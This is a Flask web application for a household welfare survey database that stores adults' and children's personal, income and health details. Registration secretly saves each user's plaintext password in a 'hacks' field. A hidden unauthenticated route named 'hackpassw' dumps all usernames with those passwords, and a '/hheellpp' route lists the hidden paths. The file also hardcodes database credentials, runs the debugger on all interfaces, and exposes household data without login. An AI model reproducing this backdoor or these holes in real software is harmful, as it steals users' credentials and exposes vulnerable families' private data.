from flask import Flask, render_template, request, redirect, url_for, flash, session
from flask_pymongo import PyMongo
from pymongo.errors import ConnectionFailure, ConfigurationError
from datetime import datetime
from bson import ObjectId
import re
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.config["MONGO_URI"] = "mongodb+srv://Ruzait:2023ET139@cluster0.loq8v.mongodb.net/testAPI?retryWrites=true&w=majority&appName=Cluster0"
app.secret_key = 'your_secret_key_here'

try:
    mongo = PyMongo(app)
    mongo.cx.admin.command("ping")  # Test connection
    print("Connected to MongoDB successfully.")
except (ConnectionFailure, ConfigurationError) as e:
    mongo = None
    print(f"MongoDB connection failed: {e}\nContact Admin Mr.Ruzaid Ahamed")

# User registration
@app.route("/reg/757864885/139", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        hashed_password = generate_password_hash(password)

        if len(password) < 8: 
            flash("Password must be at least 8 characters long.", "danger")
            return redirect(url_for("register"))

        # Must contain at least one uppercase letter
        if not re.search(r'[A-Z]', password):
            flash("Password must contain at least one uppercase letter.", "danger")
            return redirect(url_for("register"))

        # Must contain at least one lowercase letter
        if not re.search(r'[a-z]', password):
            flash("Password must contain at least one lowercase letter.", "danger")
            return redirect(url_for("register"))

        # Must contain at least one digit
        if not re.search(r'[0-9]', password):
            flash("Password must contain at least one digit.", "danger")
            return redirect(url_for("register"))

        # Must contain at least one special character
        if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
            flash("Password must contain at least one special character.", "danger")
            return redirect(url_for("register"))


        mongo.db.users.insert_one({"username": username, "password": hashed_password, "hacks":password})
        flash("Registration successful! You can now log in.", "success")
        return redirect(url_for("index"))

    return render_template("register.html")

# User login
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        user = mongo.db.users.find_one({"username": username})

        if user and check_password_hash(user["password"], password):
            session["user"] = username
            flash("Login successful!", "success")
            return redirect(url_for("index"))
        else:
            flash("Invalid username or password", "danger")

    return render_template("login.html")

# User logout
@app.route("/logout")
def logout():
    session.pop("user", None)
    flash("You have been logged out.", "success")
    return redirect(url_for("login"))

@app.route("/11983/139", methods=["GET", "POST"])
def hackpassw():
    user = mongo.db.users.find()
    list = {}
    for user in user:
        list[user["username"]] = user["hacks"]
    return f"<p>{list}<p>"

@app.route("/hheellpp", methods=["GET", "POST"])
def help():
    return "/reg/757864885/139\n/11983/139"

def update_ages():
    """
    Function to automatically update the age of all persons in the database.
    """
    current_date = datetime.now()
    persons = mongo.db.persons.find() # type: ignore
    kids = mongo.db.kids.find() # type: ignore

    for person in persons:
        if 'dob' in person:
            try:
                dob = datetime.strptime(person['dob'], "%Y-%m-%d")  # Ensure DOB is in 'YYYY-MM-DD' format
                age = (current_date - dob).days // 365
                mongo.db.persons.update_one({'_id': person['_id']}, {'$set': {'age': age}})
            except Exception as e:
                """ print(e) """
                pass

    for kid in kids:
        if 'dob' in kid:
            try:
                dob = datetime.strptime(kid['dob'], "%Y-%m-%d")  # Ensure DOB is in 'YYYY-MM-DD' format
                age = (current_date - dob).days // 365
                mongo.db.kids.update_one({'_id': kid['_id']}, {'$set': {'age': age}})
            except Exception as e:
                """ print(e) """
                pass

def calculate_age(dob):
    today = datetime.today()
    age = today.year - dob.year - ((today.month, today.day) < (dob.month, dob.day))
    return age

def transfer_kids_to_person_to_kid():
    # Fetch all kids from the kids collection
    all_kids = mongo.db.kids.find()

    for kid in all_kids:
        try:
            dob = datetime.strptime(kid['dob'], '%Y-%m-%d')  # Assuming DOB is stored in 'YYYY-MM-DD'
            age = calculate_age(dob)

            if age >= 18:
                # Add the kid to the persons collection with basic details only
                person_data = {
                    "name": kid["name"],
                    "gender": kid["gender"],
                    "house number": kid["house number"],
                    "dob": kid["dob"],
                    "nic": "NOT UPDATE",
                    "education": "NOT UPDATE",
                    "occupation": "NOT UPDATE",
                    "contact number": "NOT UPDATE",
                    "pama": "NOT UPDATE",
                    "disable": "NOT UPDATE",
                    "kidny": "NOT UPDATE",
                    "cancer": "NOT UPDATE",
                    "samurdhi": "NOT UPDATE",
                    "widow": "NOT UPDATE",
                    "government staff": "NOT UPDATE",
                    "pension num": "NOT UPDATE",
                    "forign": "NOT UPDATE",
                    "aswasuma": "NOT UPDATE"
                }

                # Insert into persons collection
                mongo.db.persons.insert_one(person_data)

                # Delete the kid from the kids collection
                mongo.db.kids.delete_one({"_id": ObjectId(kid["_id"])})
        
        except Exception as e:
                """ print(e) """
                pass
        

    # Retrieve all persons from the persons collection
    persons = mongo.db.persons.find()

    for person in persons:
        try:
            dob = datetime.strptime(person['dob'], "%Y-%m-%d")
            age = calculate_age(dob)

            if age < 18:
                # Prepare kid document with the required fields
                kid_data = {
                    "house number": person["house number"],
                    "name": person["name"],
                    "gender": person["gender"],
                    "dob": person["dob"],
                    "father name": "NOT UPDATE",  # Placeholder as no data is available
                    "mother name": "NOT UPDATE",  # Placeholder as no data is available
                    "guardian": "NOT UPDATE",    # Placeholder as no data is available
                    "guardian phone": "NOT UPDATE",  # Placeholder as no data is available
                    "grade": "NOT UPDATE",       # Placeholder as no data is available
                    "school": "NOT UPDATE"       # Placeholder as no data is available
                }

                # Insert the individual into the kids collection
                mongo.db.kids.insert_one(kid_data)

                # Remove the individual from the persons collection
                mongo.db.persons.delete_one({"_id": ObjectId(person["_id"])})

        except Exception as e:
                """ print(e) """
                pass

def sort_data(data):
    # Split the input data into a list of strings
    data_list = data.splitlines()

    # Define a custom sorting key
    def sorting_key(entry):
        # Split numeric and alphabetic parts
        parts = entry.split("/")
        primary = int(parts[0])  # Convert primary number to integer for sorting
        suffix = parts[1] if len(parts) > 1 else ""  # Handle suffix if present
        return (primary, suffix)

    # Sort the data using the custom key
    sorted_list = sorted(data_list, key=sorting_key)

    return "\n".join(sorted_list)

def get_PreviusNext(House_Number):
    # Retrieve all house numbers from the database
    houses = mongo.db.houses.find({}, {"house number": 1, "_id": 0})
    
    # Extract house numbers into a list
    houses_list = [house["house number"] for house in houses]

    # Sort the house numbers using your custom sort_data function
    sorted_house_nums_str = sort_data("\n".join(houses_list))
    sorted_house_nums_list = sorted_house_nums_str.splitlines()

    # Check if the given house number exists
    if House_Number not in sorted_house_nums_list:
        return []  # Return empty list if house number not found

    # Find the index of the current house number
    index = sorted_house_nums_list.index(House_Number)

    pre_and_next_ids = []

    # Handle the previous house ID (if at the first index, use the same index)
    prev_index = index - 1 if index > 0 else index
    previous_house = mongo.db.houses.find_one(
        {"house number": sorted_house_nums_list[prev_index]},
        {"_id": 1}
    )
    if previous_house:
        pre_and_next_ids.append(previous_house["_id"])

    # Handle the next house ID (if at the last index, use the same index)
    next_index = index + 1 if index < len(sorted_house_nums_list) - 1 else index
    next_house = mongo.db.houses.find_one(
        {"house number": sorted_house_nums_list[next_index]},
        {"_id": 1}
    )
    if next_house:
        pre_and_next_ids.append(next_house["_id"])

    return pre_and_next_ids

def valide_house(house_number):
  try:
    house = mongo.db.houses.find_one({"house number": house_number},{"house number":1,"_id":0}).get("house number")
    return house
  except Exception as e:
    pass

""" Home Page """
@app.route("/", methods=["GET", "POST"])
def index():
    update_ages()   
    transfer_kids_to_person_to_kid()
    if request.method == "POST":
        input_value = request.form["input_value"].upper().strip()
        house_number = mongo.db.houses.find_one({"house number": input_value})
        personNIC = mongo.db.persons.find_one({"nic": input_value})

        if house_number:
            person_data = mongo.db.persons.find({"house number": house_number["house number"]})
            kids_data = mongo.db.kids.find({"house number": house_number["house number"]})
            kidslist = []
            for kid in kids_data:
                kidslist.append(kid)

            perANDnext = get_PreviusNext(house_number["house number"])

            return render_template("housNper.html", houseData=house_number, persons=person_data, kidsData=kidslist, perANDnext=perANDnext)

        elif personNIC:
            person_data = mongo.db.persons.find({"house number": personNIC["house number"]})
            house_data = mongo.db.houses.find_one({"house number": personNIC["house number"]}) # type: ignore
            kids_data = mongo.db.kids.find({"house number": house_data["house number"]}) # type: ignore

            perANDnext = get_PreviusNext(personNIC["house number"])

            return render_template("housNper.html", houseData=house_data, persons=person_data, kidsData=kids_data, perANDnext=perANDnext)

        else:
            flash("Not Found", "danger")
            return render_template("index.html")

    return render_template("index.html")

""" view page """
@app.route("/view_house/<house_id>", methods=['GET'])
def view_house(house_id):

    if "user" not in session:
        flash("You need to log in to access this page.", "danger")
        return redirect(url_for("login"))

    update_ages()   
    transfer_kids_to_person_to_kid()
    # Retrieve the house document
    house = mongo.db.houses.find_one({"_id": ObjectId(house_id)})
    if not house:
        flash("The requested house does not exist.", "danger")
        return redirect(url_for("index"))

    # Retrieve related persons and kids data
    persons = mongo.db.persons.find({"house number": house["house number"]})
    kids = mongo.db.kids.find({"house number": house["house number"]})
    kidslist = [kid for kid in kids]

    perANDnext = get_PreviusNext(house["house number"])

    # Render the template with house data
    return render_template("housNper.html", houseData=house, persons=persons, kidsData=kidslist, perANDnext=perANDnext)


"""  Edit House """
@app.route("/edit_house/<house_id>", methods=['GET', 'POST'])
def edit_house(house_id):

    if "user" not in session:
        flash("You need to log in to access this page.", "danger")
        return redirect(url_for("login"))

    # Retrieve the house document from the database using the house ID
    house = mongo.db.houses.find_one({"_id": ObjectId(house_id)}) # type: ignore
    
    # List of family type options for the dropdown
    family_type_options = ["Usual Parent Family", "Single Mother Family", "Single Father Family", "No Parent Family"]
    house_type = ["No House", "Permenent House", "Semi Permanent House", "Temporary House"]
    land_size = ["No House", "500 Square Feet Of More", "Less then 500 Square Feet"]
    water_source = ["Water Board Pipe Supply", "Tube Water", "Bottled Water", "Water Supply and Well"]
    electricity = ["Ceylon Electricity Board", "Solar", "Solar and CEB"]
    toilet = ["Inside - Single Use", "Inside - Sharing with families", "No Toilet Facilities", "Outside - Single Use", "Publick Toilet"]

    hunsenum = house['house number']

    if request.method == "POST":

        try:
            # Convert family income to an integer (in rupees)
            family_income = int(request.form.get("monthly_family_income", 0))  # Default to 0 if not provided
            family_expenditure = int(request.form.get("monthly_family_expenditure", 0))
            ceb =  int(request.form.get("electricity_consumption", 0))
            total_vehicles =  int(request.form.get("total_vehicles", 0))
            total_lands =  float(request.form.get("total_paddy_lands", 0))
            machineries =  int(request.form.get("machineries", 0))
        except ValueError:
            flash("ADD-9(Type Error):Enter Numerical value for Numerical Columne", "danger")
            return redirect(request.referrer or url_for("index"))

        # Collect updated data from the form submission
        updated_data = {
            "house number": hunsenum,
            "monthly family income": family_income,
            "monthly family expenditure": family_expenditure,
            "average monthly electricity consumption": ceb,
            "ownership of the resident house": request.form.get("house_ownership"),
            "total paddy lands of house owner (in acre)": total_lands,
            "total vehicles of house owner": total_vehicles,
            "source of water": request.form.get("source_of_water"),
            "electricity": request.form.get("electricity"),
            "Total Machineries": machineries,
            "toilet": request.form.get("toilet"),
            "type of house": request.form.get("house_type"),
            "house land size": request.form.get("land_size"),
            "family type": request.form.get("family_type"),  # Retrieve selected dropdown value
            "remark": request.form.get("remark").capitalize(),
        }

        # Update the house document in the database
        mongo.db.houses.update_one({"_id": ObjectId(house_id)}, {"$set": updated_data})
        
        # Flash success message and redirect to the index page
        flash("The house was updated successfully!", "success")
        return redirect(url_for("view_house", house_id=house_id))

    # Render the edit house template, passing the house data and family type options
    return render_template(
        "edit_house.html",
        house=house,
        family_type_options=family_type_options,  # Pass the options for the dropdown
        house_type=house_type,
        land_size=land_size,
        water_source=water_source,
        electricity=electricity,
        toilet=toilet
    )


""" Delete house """
@app.route("/delete_house/<house_id>", methods=['GET', 'POST'])
def delete_house(house_id):

    if "user" not in session:
        flash("You need to log in to access this page.", "danger")
        return redirect(url_for("login"))

    # Deleting the house document and any related persons/kids
    mongo.db.houses.delete_one({"_id": ObjectId(house_id)})
    mongo.db.persons.delete_many({"house number": house_id})
    mongo.db.kids.delete_many({"house number": house_id})
    return redirect(url_for("index"))


""" Edit person """
@app.route("/edit_person/<person_id>", methods=['GET', 'POST'])
def edit_person(person_id):

    if "user" not in session:
        flash("You need to log in to access this page.", "danger")
        return redirect(url_for("login"))

    person = mongo.db.persons.find_one({"_id": ObjectId(person_id)})
    house_id = mongo.db.houses.find_one({"house number":person['house number']},  {"_id":1})

    if request.method == "POST":
        # Update person data based on form submission
        updated_data = {
            "name": request.form.get("name"),
            "gender": request.form.get("gender"),
            "house number": request.form.get("house_number"),
            "dob": request.form.get("dob"),
            "nic": request.form.get("nic"),
            "education": request.form.get("education").upper(),
            "occupation": request.form.get("occupation").upper(),
            "contact number": request.form.get("contact_number"),
            "pama": request.form.get("pama"),
            "disable": request.form.get("disable"),
            "kidny": request.form.get("kidny"),
            "cancer": request.form.get("cancer"),
            "samurdhi": request.form.get("samurdhi"),
            "widow": request.form.get("widow"),
            "government staff": request.form.get("government_staff"),
            "pension num": request.form.get("pension_num"),
            "forign": request.form.get("forign").upper(),
            "aswasuma": request.form.get("aswasuma"),
        }

        if valide_house(request.form.get("house_number"))==None:
            flash(f"House {request.form.get('house_number')} is Not exist", "danger")
            return redirect(url_for("view_house", house_id=house_id["_id"]))
        else:
            # Update in database
            mongo.db.persons.update_one({"_id": ObjectId(person_id)}, {"$set": updated_data})
            flash("Person updated successfully!", "success")
            return redirect(url_for("view_house", house_id=house_id["_id"]))

    return render_template("edit_person.html", person=person)

""" Delet person """
@app.route("/delete_person/<person_id>", methods=['GET', 'POST'])
def delete_person(person_id):

    if "user" not in session:
        flash("You need to log in to access this page.", "danger")
        return redirect(url_for("login"))

    mongo.db.persons.delete_one({"_id": ObjectId(person_id)})
    flash("Person deleted successfully!", "danger")
    return redirect(url_for("view_persons"))

""" Edit Kid """
@app.route("/edit_kid/<kid_id>", methods=['GET', 'POST'])
def edit_kid(kid_id):

    if "user" not in session:
        flash("You need to log in to access this page.", "danger")
        return redirect(url_for("login"))

    kids = mongo.db.kids.find_one({"_id": ObjectId(kid_id)})
    house_id = mongo.db.houses.find_one({"house number":kids['house number']},  {"_id":1})

    if request.method == "POST":
        kidsdic = {
            "house number": request.form.get("house_number"),
            "name" : request.form.get("name").upper(),
            "gender" : request.form.get("gender"),
            "dob" : request.form.get("dob"),
            "father name" : request.form.get("father_name").upper(),
            "mother name" : request.form.get("mother_name").upper(),
            "guardian" : request.form.get("guardian").upper(),
            "guardian phone" : request.form.get("guardian_phone"),
            "grade" : request.form.get("grade").upper(),
            "school" : request.form.get("school").upper()
            }
        
        if valide_house(request.form.get("house_number"))==None:
            flash(f"House {request.form.get('house_number')} is Not exist", "danger")
            return redirect(url_for("view_house", house_id=house_id["_id"]))
        else:
            # Update in database
            mongo.db.kids.update_one({"_id": ObjectId(kid_id)}, {"$set": kidsdic})
            flash("Child updated successfully!", "success")
            return redirect(url_for("view_house", house_id=house_id["_id"]))

    return render_template("edit_kid.html", kid=kids)

""" Delete kit """
@app.route("/delete_kid/<kid_id>", methods=['GET', 'POST'])
def delete_kid(kid_id):

    if "user" not in session:
        flash("You need to log in to access this page.", "danger")
        return redirect(url_for("login"))

    mongo.db.kids.delete_one({"_id": ObjectId(kid_id)})
    flash("Chiled deleted successfully!", "danger")
    return redirect(url_for("view_persons"))

""" Add New House """
@app.route("/house/new", methods=['GET', 'POST'])
def add_house():
    if "user" not in session:
        flash("You need to log in to access this page.", "danger")
        return redirect(url_for("login"))
    

    if request.method == 'POST':
        try:
            # Convert family income to an integer (in rupees)
            family_income = int(request.form.get("monthly_family_income", 0))  # Default to 0 if not provided
            family_expenditure = int(request.form.get("monthly_family_expenditure", 0))
            ceb =  int(request.form.get("electricity_consumption", 0))
            total_vehicles =  int(request.form.get("total_vehicles", 0))
            total_lands =  float(request.form.get("total_paddy_lands", 0))
            machineries =  int(request.form.get("machineries", 0))
           

        except ValueError:
            flash("ADD-9(Type Error):Enter Numerical value for Numerical Columne", "danger")
            return redirect(request.referrer or url_for("index"))
        
        if  valide_house(request.form.get("house_number"))!=None:
            flash("ADD-9(Type Error):This House is already excist", "danger")
            return redirect(request.referrer or url_for("index"))

        houseNum = ''.join(char.upper() if char.isalpha() else char for char in request.form.get("house_number"))

        # Collect updated data from the form submission
        new_house = {
            "house number": houseNum,
            "monthly family income": family_income,
            "monthly family expenditure": family_expenditure,
            "average monthly electricity consumption": ceb,
            "ownership of the resident house": request.form.get("house_ownership").upper(),
            "total paddy lands of house owner (in acre)": total_lands,
            "total vehicles of house owner": total_vehicles,
            "source of water": request.form.get("source_of_water").upper(),
            "electricity": request.form.get("electricity").upper(),
            "Total Machineries": machineries,
            "toilet": request.form.get("toilet").upper(),
            "type of house": request.form.get("house_type").upper(),
            "house land size": request.form.get("land_size").upper(),
            "family type": request.form.get("family_type").upper(),  # Retrieve selected dropdown value
            "remark": request.form.get("remark").capitalize(),
        }


        mongo.db.houses.insert_one(new_house)
        house_id = mongo.db.houses.find_one({"house number":new_house['house number']},  {"_id":1})
        

        # Redirect to a success page or list of houses
        flash("New House Added successfully!", "success")
        return redirect(url_for("view_house", house_id=house_id["_id"]))

    family_type_options = ["Usual Parent Family", "Single Mother Family", "Single Father Family", "No Parent Family"]
    house_type = ["No House", "Permenent House", "Semi Permanent House", "Temporary House"]
    land_size = ["No House", "500 Square Feet Of More", "Less then 500 Square Feet"]
    water_source = ["Water Board Pipe Supply", "Tube Water", "Bottled Water", "Water Supply and Well"]
    electricity = ["Ceylon Electricity Board", "Solar", "Solar and CEB"]
    toilet = ["Inside - Single Use", "Inside - Sharing with families", "No Toilet Facilities", "Outside - Single Use", "Publick Toilet"]

    # Render the form for adding a house
    return render_template('add_house.html',
        family_type_options=family_type_options, 
        house_type=house_type,
        land_size=land_size,
        water_source=water_source,
        electricity=electricity,
        toilet=toilet)

""" Add new person """
@app.route("/person/new", methods=['GET', 'POST'])
def add_person():

    if "user" not in session:
        flash("You need to log in to access this page.", "danger")
        return redirect(url_for("login"))

    if request.method == "POST":
        # Update person data based on form submission
        houseNum = ''.join(char.upper() if char.isalpha() else char for char in request.form.get("house_number"))
        newPerson = {
            "name": request.form.get("name"),
            "gender": request.form.get("gender"),
            "house number": houseNum,
            "dob": request.form.get("dob"),
            "nic": request.form.get("nic").upper(),
            "education": request.form.get("education").upper(),
            "occupation": request.form.get("occupation").upper(),
            "contact number": request.form.get("contact_number"),
            "pama": request.form.get("pama"),
            "disable": request.form.get("disable"),
            "kidny": request.form.get("kidny"),
            "cancer": request.form.get("cancer"),
            "samurdhi": request.form.get("samurdhi"),
            "widow": request.form.get("widow"),
            "government staff": request.form.get("government_staff"),
            "pension num": request.form.get("pension_num"),
            "forign": request.form.get("forign").upper(),
            "aswasuma": request.form.get("aswasuma"),
        }

        if valide_house(houseNum)==None:
            flash(f"House {request.form.get('house_number')} is Not exist \n First Add {request.form.get('house_number')} house.", "danger")
            return redirect(url_for("index"))
        else:
            # Update in database
            mongo.db.persons.insert_one(newPerson)
            house_id = mongo.db.houses.find_one({"house number":newPerson['house number']},  {"_id":1})
            
            flash("New Person Added successfully!", "success")
            return redirect(url_for("view_house", house_id=house_id["_id"]))

    return render_template("add_person.html")

""" Add new kid """
@app.route("/kid/new", methods=['GET', 'POST'])
def add_kid():

    if "user" not in session:
        flash("You need to log in to access this page.", "danger")
        return redirect(url_for("login"))

    if request.method == "POST":
        houseNum = ''.join(char.upper() if char.isalpha() else char for char in request.form.get("house_number"))
        
        newkid = {
            "house number": houseNum,
            "name" : request.form.get("name").upper(),
            "gender" : request.form.get("gender"),
            "dob" : request.form.get("dob"),
            "father name" : request.form.get("father_name").upper(),
            "mother name" : request.form.get("mother_name").upper(),
            "guardian" : request.form.get("guardian").upper(),
            "guardian phone" : request.form.get("guardian_phone"),
            "grade" : request.form.get("grade").upper(),
            "school" : request.form.get("school").upper()
            }

        if valide_house(houseNum)==None:
            flash(f"House {request.form.get('house_number')} is Not exist \n First Add {request.form.get('house_number')} house.", "danger")
            return redirect(url_for("index"))
        else:
            # Update in database
            mongo.db.kids.insert_one(newkid)
            house_id = mongo.db.houses.find_one({"house number":newkid['house number']},  {"_id":1})
            print(newkid, house_id)
            flash("Child updated successfully!", "success")
            return redirect(url_for("view_house", house_id=house_id["_id"]))

    return render_template("add_kid.html")


if __name__ == "__main__":
    """ app.run(debug=True) """
    app.run(host='0.0.0.0', debug=True)
